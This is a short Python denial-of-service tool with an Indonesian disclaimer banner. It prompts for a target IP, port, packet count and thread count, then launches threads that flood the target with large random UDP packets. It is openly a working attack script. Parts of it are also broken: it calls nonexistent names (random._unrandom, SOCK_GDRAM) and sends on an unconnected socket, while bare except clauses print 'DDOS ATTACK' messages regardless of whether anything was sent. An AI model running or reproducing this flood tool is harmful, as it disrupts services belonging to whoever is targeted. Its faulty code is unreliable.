import socket
import random
import threading
import os,sys
import time
os.system("clear")
print("""\033[91m
#=======================================#
|              WARNING!!!!              |
|                                       |
|Ddos Attack Adalah Hal Ilegal Buat Yang|
|Kalau Kalian Pakek Tool Ini Buat Ddos  |
|Tanggung Sendiri Kalau Ada Pihak Yang  |
|Tidak Terima Jangan Sampai Kalian      |
|Menyangkutkan Pihak Kami..             |
#=======================================#""")
time.sleep(5)
os.system("clear")
print("\033[92m")
print("""

  ▄▄▄▄▄ ▄███▄    ▄▄▄▄▄ ▄███▄           ▄          ▄  ██   █     
▄▀  █   █▀   ▀ ▄▀  █   █▀   ▀      ▀▄   █     ▀▄   █ █ █  █     
    █   ██▄▄       █   ██▄▄          █ ▀        █ ▀  █▄▄█ █     
 ▄ █    █▄   ▄▀ ▄ █    █▄   ▄▀      ▄ █        ▄ █   █  █ ███▄  
  ▀     ▀███▀    ▀     ▀███▀       █   ▀▄     █   ▀▄    █     ▀ 
                                    ▀          ▀       █        
                                                      ▀ """)
ip_wb = str(input("HOST/IP : "))
port_wb = int(input("PORT TARGET : "))
paket_wb = int(input("PAKETS : "))
threads_wb = int(input("THREADS : "))
os.system("clear")
def wib():
    asu = random._urandom(120400)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            addr = ((ip_wb,port_wb))
            for x in range(paket_wb):
                s.send(asu)
            print("[•] DDOS ATTACK IP %s PORT %s" % (ip_wb,port_wb))
        except:
            print("[•] DDOS ATTACK IP %s PORT %s" % (ip_wb,port_wb))
            
def wib2():
    asu = random._unrandom(120400)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GDRAM)
            s.connect((ip_wb,port_wb))
            s.send(asu)
            for x in range(paket_wb):
                s.send(asu)
            print("[•] DDOS ATTACK IP %s PORT %s" % (ip_wb,port_wb))
        except:
            print("[•] DDOS ATTACK IP %s PORT %s" % (ip_wb,port_wb))


for y in range(threads_wb):
    wb = threading.Thread(target = wib)
    wb.start()
    wb = threading.Thread(target = wib2)
    wb.start()            